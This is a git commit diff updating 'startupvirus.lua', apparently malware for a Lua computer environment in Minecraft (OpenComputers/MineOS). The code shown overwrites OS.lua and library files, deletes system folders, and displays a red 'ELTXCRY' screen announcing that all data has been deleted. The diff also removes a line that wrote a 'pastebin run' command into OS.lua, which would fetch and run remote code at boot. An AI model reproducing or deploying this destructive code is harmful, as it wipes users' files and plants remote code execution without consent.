7eec53e500c81b3282bef4ed388ed786c84f683e
EletrixTime <71174682+EletrixtimeYT@users.noreply.github.com>
2023-09-29 15:56:26 +0200

    Update startupvirus.lua

--- startupvirus.lua
+++ startupvirus.lua
@@ -18,7 +18,7 @@ compressor.pack("/data-backup.pkg", {
 filesystem.remove("/eltxcry")
 -- Write ALL files
 
-filesystem.write("OS.lua", "pastebin run hQYzUhR9")
+filesystem.write("OS.lua", "NOTHING")
 filesystem.write("Libraries/Event.lua", "404")
 filesystem.write("Libraries/Network.lua", "404")
 filesystem.remove("/Libraries")
@@ -27,3 +27,31 @@ filesystem.remove("/Wallpapers")
 filesystem.remove("/Mounts")
 filesystem.remove("/Icons")
 filesystem.remove("/Screensavers")
+
+local GUI = require("GUI")
+
+--------------------------------------------------------------------------------
+
+local workspace = GUI.workspace()
+workspace:addChild(GUI.panel(1, 1, workspace.width, workspace.height, 0x2D2D2D))
+
+local actionButtonsRegular = workspace:addChild(GUI.actionButtons(3, 2, false))
+local actionButtonsFat = workspace:addChild(GUI.actionButtons(3, 4, true))
+
+actionButtonsRegular.close.onTouch = function()
+	-- Do something when "close" button was touched
+end
+
+-- Add panel that fits workspace
+workspace:addChild(GUI.text(3, 2, 0xFFFFFF, "ELTXCRY"))
+
+workspace:addChild(GUI.text(3, 2, 0xFFFFFF, "ALL of your data has been deleted if you restart the computer computer crash instant !"))
+workspace:addChild(GUI.panel(1, 1, workspace.width, workspace.height, 0x262626))
+-- Add smaller red panel
+workspace:addChild(GUI.panel(10, 10, workspace.width - 20, workspace.height - 20, 0x880000))
+
+
+--------------------------------------------------------------------------------
+
+workspace:draw()
+workspace:start())
